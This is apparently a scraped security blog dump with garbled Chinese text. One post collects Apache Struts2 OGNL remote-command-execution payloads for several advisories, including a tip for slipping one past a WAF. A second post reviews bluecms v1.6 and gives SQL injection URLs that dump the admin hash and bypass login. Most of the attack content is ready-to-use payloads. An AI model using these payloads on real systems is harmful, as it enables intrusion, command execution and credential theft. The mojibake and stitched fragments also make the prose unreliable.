ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43mycmd\\75\\&apos;&quot;+cmd+&quot;\\&apos;&apos;)(d))&amp;(h)((&apos;\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)&apos;)(d))&amp;(i)((&apos;\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\\43myres\\75new\\40byte[51020]&apos;)(d))&amp;(k)((&apos;\\43mydat.readFully(\\43myres)&apos;)(d))&amp;(l)((&apos;\\43mystr\\75new\\40java.lang.String(\\43myres)&apos;)(d))&amp;(m)((&apos;\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\\43myout.getWriter().println(\\43mystr)&apos;)(d)) ‰∏äÈù¢2‰∏™PoCÊëòËá™k8teamÔºå‰∏∫‰∫ÜÂÜôPoCÔºåÊúâÊâÄÊîπÂä®Ôºå‰ΩÜÊòØËøôÈáåÂ∞±‰∏çË¥¥‰∏äÊù•‰∫ÜÔºöÔºâ Struts2 S2-009ÂΩ±ÂìçÁâàÊú¨: 2.0.0 - 2.3.1.1 ÊºèÊ¥ûËØ¶ÊÉÖ: https://struts.apache.org/docs/s2-009.html ÊºèÊ¥ûÂà©Áî®ÁÇπË∑üS2-003ÂíåS2-005Á±ª‰ººÔºåÂà©Áî®OGNLË°®ËææÂºè(1)(2),‰ºöÊâßË°å1ÁöÑOGNLË°®ËææÂºèÔºå009ÊûÑÈÄ†‰∫ÜÁöÑÊñπÊ≥ï‰∏∫test=(some OGNL Ë°®ËææÂºè)(1)&amp;z[(test)(1)]=true„ÄÇz[(test)(1)]=true,ÂØπstruts2Êù•ËØ¥ÊòØÂêàÊ≥ïÁöÑÂèÇÊï∞Ôºå‰ΩÜÊòØ(test)(1)‰ºöÊâßË°å‰∏äËø∞ËØ¥ÁöÑÊñπÊ≥ïÔºåtestÁöÑÂÄºË¢´Â∏¶ÂÖ•ËÆ°ÁÆóÔºåÈÄ†ÊàêÂëΩ‰ª§ÊâßË°å„ÄÇ ÊûÑÈÄ†PoCÂºπËÆ°ÁÆóÂô®ps:ÂÆûÈ™åÁéØÂ¢ÉËØï‰∫ÜÂ•ΩÂá†Ê¨°ÈÉΩ‰∏çËÉΩÊâßË°åÁ≥ªÁªüÂëΩ‰ª§ÔºåË∑ØËøáÁöÑÂ§ß‰Ω¨Ê±ÇÊåáÊïôÔºöÔºâ 1person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true Áî®ÁöÑÊòØperson/new-person.actionËøô‰∏™ÊéßÂà∂Âô® Ëé∑ÂèñwebÊ†πÁõÆÂΩï1person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot; Struts2 S2-012ÂΩ±ÂìçÁâàÊú¨: 2.0.0 - 2.3.13 ÊºèÊ¥ûËØ¶ÊÉÖ: https://cwiki.apache.org/confluence/display/WW/S2-012 Action ‰∏≠ Result Êó∂‰ΩøÁî®‰∫ÜÈáçÂÆöÂêëÁ±ªÂûãÔºåÂπ∂‰∏îËøò‰ΩøÁî® ${param_name} ‰Ωú‰∏∫ÈáçÂÆöÂêëÂèòÈáè,strutsÂú®Ëé∑ÂèñÂÖ∂ÂÄºÊó∂‰ºöÊâßË°åOGNLË°®ËææÂºèÔºå‰ªéËÄåÈÄ†ÊàêÂëΩ‰ª§ÊâßË°å ÊûÑÈÄ†PoCËé∑ÂèñwebÊ†πË∑ØÂæÑ1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A Struts2 S2-013/S2-014ÂΩ±ÂìçÁâàÊú¨: 2.0.0 - 2.3.14.1 ÊºèÊ¥ûËØ¶ÊÉÖ: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014 Ê†áÁ≠æs:urlÂíås:a‰∏≠Êèê‰æõincludeÂèÇÊï∞ÔºåÂÖ∂ÂèÇÊï∞ÂÄºÂèØ‰ª•‰∏∫ none - include no parameters in the URL (default) get - include only GET parameters in the URL all - include both GET and POST parameters in the URL Â¶ÇÊûúÂèÇÊï∞ÂÄº‰∏∫getÊàñallÔºåÂú®Ëé∑ÂèñÂØπÂ∫îÁöÑÂèÇÊï∞ÂÄºÊó∂ÊâßË°å‰∫ÜOGNLË°®ËææÂºè ÊûÑÈÄ†PoCËé∑ÂèñwebÊ†πÁõÆÂΩï1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125; ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125; Struts2 S2-016ÂΩ±ÂìçÁâàÊú¨: 2.0.0 - 2.3.15 ÊºèÊ¥ûËØ¶ÊÉÖ: https://struts.apache.org/docs/s2-016.html DefaultActionMapper Á±ªÊîØÊåÅ‰ª• action:Ôºåredirect: Âíå redirectAction: ‰Ωú‰∏∫ËÆøÈóÆÂâçÁºÄÔºåÂâçÁºÄÂêéÈù¢ÂèØ‰ª•Ë∑ü OGNL Ë°®ËææÂºèÔºåÁî±‰∫é Struts2 Êú™ÂØπÂÖ∂ËøõË°åËøáÊª§ÔºåÂØºËá¥‰ªªÊÑè Action ÂèØ‰ª•‰ΩøÁî®Ëøô‰∫õÂâçÁºÄÊâßË°å‰ªªÊÑè OGNL Ë°®ËææÂºèÔºå‰ªéËÄåÂØºËá¥‰ªªÊÑèÂëΩ‰ª§ÊâßË°å ‰∏äÊñáÂºïÁî®rickgrayÁöÑÊèèËø∞„ÄÇ ÊûÑÈÄ†PoCËé∑ÂèñwebÊ†πÁõÆÂΩï1?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125; ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§1?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos; ËøòÊúâ‰∏ÄÁßçÊØîËæÉÈöêËîΩÁöÑÊñπÊ≥ïÔºåÂ∞ÜPoCÊîæÂú®Êñá‰ª∂‰∏ä‰º†ÁöÑnameÂ§ÑÔºåËøáwaf„ÄÇ Struts2 S2-019ÂΩ±ÂìçÁâàÊú¨: 2.0.0 - 2.3.15.1 ÊºèÊ¥ûËØ¶ÊÉÖ: https://cwiki.apache.org/confluence/display/WW/S2-019 ËØ•ÊºèÊ¥ûÊàêÂõ†‰∏∫ÂºÄÂêØ‰∫ÜÂºÄÂèëËÄÖÊ®°ÂºèÔºå‰º†ÂÖ•debug=command&amp;expression=ÂØºËá¥ÊâßË°åOGNLË°®ËææÂºèÔºå‰ªéËÄåÈÄ†ÊàêÂëΩ‰ª§ÊâßË°åÊºèÊ¥û„ÄÇ ÊûÑÈÄ†PoCËé∑ÂèñwebÊ†πË∑ØÂæÑ1debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29 ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§1debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A Struts2 S2-032ÂΩ±ÂìçÁâàÊú¨: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3) ÊºèÊ¥ûËØ¶ÊÉÖ: https://struts.apache.org/docs/s2-032.html Âú®ÈÖçÁΩÆ‰∫Ü Struts2 DMI ‰∏∫ True ÁöÑÊÉÖÂÜµ‰∏ãÔºåÂèØ‰ª•‰ΩøÁî® method: Action ÂâçÁºÄÂéªË∞ÉÁî®Â£∞Êòé‰∏∫ public ÁöÑÂáΩÊï∞ÔºåDMI ÁöÑÁõ∏ÂÖ≥‰ΩøÁî®ÊñπÊ≥ïÂèØÂèÇËÄÉÂÆòÊñπ‰ªãÁªçÔºàDynamic Method InvocationÔºâÔºåËøô‰∏™ DMI ÁöÑË∞ÉÁî®ÁâπÊÄßÂÖ∂ÂÆû‰∏ÄÁõ¥Â≠òÂú®ÔºåÂè™‰∏çËøáÂú®‰ΩéÁâàÊú¨‰∏≠ Strtus2 ‰∏ç‰ºöÂØπ name ÊñπÊ≥ïÂÄºÂÅö OGNL ËÆ°ÁÆóÔºåËÄåÂú®È´òÁâàÊú¨‰∏≠‰ºöÔºå‰ª£Á†ÅËØ¶ÊÉÖÂèØÂèÇËÄÉÈòøÂ∞îÊ≥ïÂÆûÈ™åÂÆ§ÁöÑÊä•Âëä - „ÄäApache Struts2 s2-032ÊäÄÊúØÂàÜÊûêÂèäÊºèÊ¥ûÊ£ÄÊµãËÑöÊú¨„Äã ‰∏äÊñáÂºïÁî®rickgrayÁöÑÊèèËø∞„ÄÇ ÊûÑÈÄ†PoCËé∑ÂèñwebÊ†πÁõÆÂΩï1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: Struts2 S2-037ÂΩ±ÂìçÁâàÊú¨: 2.3.20 - 2.3.28.1 ÊºèÊ¥ûËØ¶ÊÉÖ: http://struts.apache.org/docs/s2-037.html Ëøô‰∏™ÊºèÊ¥ûÂíå‰πãÂâçS2-032/033ÊòØ‰∏Ä‰∏™Âú∞ÊñπÔºåÈÉΩÊòØÂú®DefaultActionInvocation.javaÁöÑinvokeActionÊñπÊ≥ï‰∏≠Ê≤°ÊúâÂØπ‰∫émethodNameÂèÇÊï∞ÂÜÖÂÆπËøõË°åÊ†°È™åÔºå‰æøÁõ¥Êé•‰∏¢Âà∞‰∫ÜgetValueÊñπÊ≥ïÈáåÈù¢Ôºå‰ªéËÄåÈÄ†ÊàêOnglË°®ËææÂºèÁöÑÊ≥®ÂÖ•„ÄÇ ‰∏äÊñáÂºïÁî®nsfocus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)ÁöÑÊèèËø∞ ÊûÑÈÄ†PoCËé∑ÂèñwebÊ†πÁõÆÂΩï1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: ÊÄªÁªìStruts2ÂëΩ‰ª§ÊâßË°åÁÆóÊòØ‰∏Ä‰∏™ÊØîËæÉÁªèÂÖ∏ÁöÑÊºèÊ¥û‰∫ÜÔºåÂ∏åÊúõ‰ª•ÂêéÊ∑±ÂÖ•javaÁöÑ‰∏Ä‰∫õÊ°ÜÊû∂ÔºåÂèØ‰ª•‰ªéÂ∫ïÂ±ÇÊù•ÂàÜÊûêÔºöÔºâ"},{"title":"„ÄêCode Review„Äëbluecms v1.6 Sql Injection ÂàÜÊûê","permalink":"http://blog.0kami.cn/2017/01/11/old-old-bluecms-v1-6-Sql-Injection/","text":"Ê¶ÇËø∞Âæà‰πÖÊ≤°Êúâ‰ª£Á†ÅÂÆ°ËÆ°‰∫ÜÔºåÊãø‰∏ÄÂ•óÁÆÄÂçïÁöÑÊâæÊâæÊÑüËßâ„ÄÇbluecmsÊòØ‰∏ÄÂ•óÊØîËæÉËÄÅÁöÑÈó®Êà∑ÁΩëÁ´ôcmsÔºåÁΩë‰∏ä‰πüÊúâÂæàÂ§öÂÖ≥‰∫éÂÆÉÁöÑÊºèÊ¥ûËøòÊú™‰øÆË°•ÔºåÊâÄ‰ª•‰∏ãÊñáÁöÑÊºèÊ¥û‰πü‰∏çÁÆóÊòØÊúÄÊñ∞ÁöÑÔºå‰ªÖÂΩìÊòØÁªÉÁªÉÊâã„ÄÇ SQLÊ≥®ÂÖ•ÂàÜÊûêÈ¶ñÂÖàÂÖ≥Ê≥®‰∏Ä‰∏ãÊï∞ÊçÆÁöÑËæìÂÖ• ÂÖ®Â±ÄÊï∞ÊçÆËΩ¨‰πâÂú®common.inc.php‰∏≠ 1234567if(!get_magic_quotes_gpc())&#123; $_POST = deep_addslashes($_POST); $_GET = deep_addslashes($_GET); $_COOKIES = deep_addslashes($_COOKIES); $_REQUEST = deep_addslashes($_REQUEST);&#125; ÂÜçË∑üËøõ‰∏Ä‰∏ãdeep_addslashes 123456789101112131415function deep_addslashes($str)&#123; if(is_array($str)) &#123; foreach($str as $key=&gt;$val) &#123; $str[$key] = deep_addslashes($val); &#125; &#125; else &#123; $str = addslashes($str); &#125; return $str;&#125; ÂèØ‰ª•ÂèëÁé∞ÂØπÊï∞ÊçÆÁöÑÊ≥®ÂÖ•ÔºåËøõË°å‰∫ÜÂä†ÊñúÊù†ËΩ¨‰πâÁöÑÊìç‰Ωú„ÄÇÈÇ£‰πàÊé•‰∏ãÊù•ÊâæÊ≥®ÂÖ•ÊÄùË∑Ø‰∏ªË¶ÅÊúâ‰ª•‰∏ã3ÁÇπÔºö ÊâæÊï¥Êï∞ÂûãÊ≥®ÂÖ• Êï¥Â•ócmsÈªòËÆ§gb2312ÁºñÁ†ÅÔºåÂÆπÊòìÈÄ†ÊàêÂÆΩÂ≠óËäÇÊ≥®ÂÖ• httpÂ§¥Âπ∂‰∏çÂú®ËΩ¨‰πâÁöÑËåÉÂõ¥ÂÜÖÔºåÊâÄ‰ª•Á±ª‰ººÂ≠òÂÖ•ipÔºårefferÁöÑ‰ΩçÁΩÆ‰πüËÉΩÂèëÁîüÊ≥®ÂÖ• Êï¥Êï∞ÂûãÊ≥®ÂÖ•ÊãøgrepÂåπÈÖç‰∫Ü‰∏Ä‰∏ã$_GETÔºåÊâæÂà∞‰∏ÄÂ§Ñ‰∏çÂÅöÂÖ∂‰ªñËøáÊª§ÁöÑÊï¥Êï∞Âûã‰ΩçÁΩÆ 1./ad_js.php:$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;; Ë∑üËøõad_js.php 12345678$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;if(empty($ad_id))&#123; echo &apos;Error!&apos;; exit();&#125;$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id); getoneÂáΩÊï∞ 12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÂØπad_idÊ≤°ÊúâÂÅöÂÖ∂‰ªñËøáÊª§Â§ÑÁêÜÔºåÈÄ†Êàê‰∫ÜÊï¥Êï∞ÂûãÊ≥®ÂÖ•,Áî±‰∫éÂêéÈù¢‰ºöÂ∞Üad_contentÊâìÂç∞Âú®È°µÈù¢‰∏äÔºåÊâÄ‰ª•Áõ¥Êé•Áî®unionÊ≥®ÂÖ•Â∞±ÂèØ‰ª•Ëé∑ÂæóÊï∞ÊçÆÔºåÊûÑÈÄ†payload 1/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201 ÁªìÊûúÂèØ‰ª•Âú®ËøîÂõûÁöÑÁïåÈù¢‰∏≠ÁúãÂà∞ 123&lt;!--document.write(&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;);--&gt; ps:Âõ†‰∏∫ËØ•cmsÈîôËØØÂõûÊòæÂÖ∑‰ΩìsqlËØ≠Âè•ÔºåË°®ÂâçÁºÄÂèØ‰ª•ÈÄöËøáÊä•ÈîôÁöÑÊñπÊ≥ïÊääË°®ÂâçÁºÄÁàÜÂá∫Êù•„ÄÇ ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•bluecmsÊìç‰ΩúÊï∞ÊçÆÂ∫ìÁöÑÂÖ∑‰ΩìÁ±ªÂÆö‰πâÂú®mysql.class.php,ÈªòËÆ§ËøûÊé•Êó∂ÁöÑÁºñÁ†Å‰∏∫gbkÔºåÊàë‰ª¨ÂèØ‰ª•Áü•ÈÅìÂΩìÊï∞ÊçÆÂ∫ìËøûÊé•Êó∂ÁöÑÁºñÁ†Å‰∏∫gbkÁ≠âÂèåÂ≠óËäÇÁºñÁ†ÅÊó∂ÔºåÂÆπÊòìÂèëÁîüÂÆΩÂ≠óËäÇÊ≥®ÂÖ•„ÄÇÂâçÈù¢ÊèêÂà∞ËØ•Â•ócmsÂØπÊï∞ÊçÆËæìÂÖ•ËøõË°å‰∫ÜËΩ¨‰πâÁöÑÊìç‰ΩúÔºåÈÇ£‰πàÂàöÂàöÂ•ΩÊù°‰ª∂ÈÉΩÈΩê‰∫ÜÔºåÂøÖÁÑ∂Â≠òÂú®ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•„ÄÇgrepÁúã‰∫Ü‰∏Ä‰∏ãÔºåÂü∫Êú¨‰∏äÁöÑÂ≠óÁ¨¶‰∏≤ÈÉΩÂè™ÊòØÂÅö‰∫ÜËΩ¨‰πâÂ§ÑÁêÜÔºåÊâÄ‰ª•Â≠óÁ¨¶‰∏≤Êï∞ÊçÆËæìÂÖ•ÁÇπÈÉΩÂ≠òÂú®ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•„ÄÇÂ§ßÂ§öÊï∞Ê≥®ÂÖ•ÈÉΩÊòØÁõ≤Ê≥®ÔºåÊ≤°ÊâæÂà∞ÂÖ∑‰ΩìÂèØ‰ª•‰ºöÊòæÊï∞ÊçÆÁöÑÂú∞ÊñπÔºåËøôÈáåÂ∞±ÁÆÄÂçïÁúã‰∏Ä‰∏ãÁôªÈôÜÂ§Ñ ÂêéÂè∞ÁôªÂΩïÂ§ÑÂÖ∂ÂÆûÂâçÂè∞user.phpÔºå‰πüÂ≠òÂú®Ê≥®ÂÖ•ÔºåÂè™ÊòØÁõ≤Ê≥®ÔºåËøôÈáåÂ∞±ÂèñÁÆÄÂçïÁöÑÂêéÂè∞ÁôªÂΩïÈ™åËØÅÂ§Ñadmin/login.php 12345678910111213141516171819202122elseif($act == &apos;do_login&apos;)&#123; $admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;; $admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;; $remember = isset($_POST) ? intval($_POST[&apos;rememberme&apos;]) : 0; if($admin_name == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if($admin_pwd == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if(check_admin($admin_name, $admin_pwd))&#123; update_admin_info($admin_name); if($remember == 1)&#123; setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400); setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400); setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400); &#125; &#125;else&#123; showmsg(&apos;xxx&apos;); &#125; showmsg(&apos;xxx&apos;, &apos;index.php&apos;); &#125; ÁªßÁª≠Ë∑üËøõcheck_admin 12345678910111213function check_admin($name, $pwd)&#123; global $db; $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;); if($row[&apos;num&apos;] &gt; 0) &#123; return true; &#125; else &#123; return false; &#125;&#125; ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÂèëÁîü‰∫Ü‰∏ÄÊ¨°ÁôªÈôÜÈ™åËØÅÔºåÂèØ‰ª•ÈÄöËøáÂÆΩÂ≠óËäÇÊ≥®ÂÖ•Êù•ÂÅö‰∏áËÉΩÂØÜÁ†ÅÁôªÈôÜ„ÄÇ 1user_name=admin%65%27+or+1%3D1%23&amp;pwd=123 Â≠òÂÖ•ipÈÄ†ÊàêÊ≥®ÂÖ•Âú®common.inc.php‰∏≠ÂèØ‰ª•ÊâæÂà∞getip()ÂáΩÊï∞ 12345678910111213141516171819202122232425262728function getip()&#123; if (getenv(&apos;HTTP_CLIENT_IP&apos;)) &#123; $ip = getenv(&apos;HTTP_CLIENT_IP&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED&apos;); &#125; else &#123; $ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; &#125; return $ip;&#125; ÂÜçÁúãÁúãË∞ÉÁî®‰ªñÁöÑ‰ΩçÁΩÆ online_ipË∞ÉÁî®Â§Ñ ÁúãÁúãguest_book.phpÂ§ÑÂ≠òÂú®insertÊ≥®ÂÖ•ÔºåÂπ∂‰∏îÂèØ‰ª•ÈÄöËøáË¶ÜÁõñÂêéÈù¢ÁöÑcontentÔºåÈÄ†ÊàêÊï∞ÊçÆÂõûÊòæ„ÄÇÈÄöËøáxff‰º†ÂÖ•Ê≥®ÂÖ•ËØ≠Âè•ÊàñËÄÖclient ip‰º†ÂÖ•„ÄÇ ÁªìÊûúÂèØ‰ª•ÁúãÂà∞ ÂÖ∂‰ªñ‰ΩçÁΩÆÁöÑÊ≥®ÂÖ•Ôºå‰∏çËÉΩÂõûÊòæÔºåÂ∞±‰∏çÂàÜÊûê‰∫Ü„ÄÇ 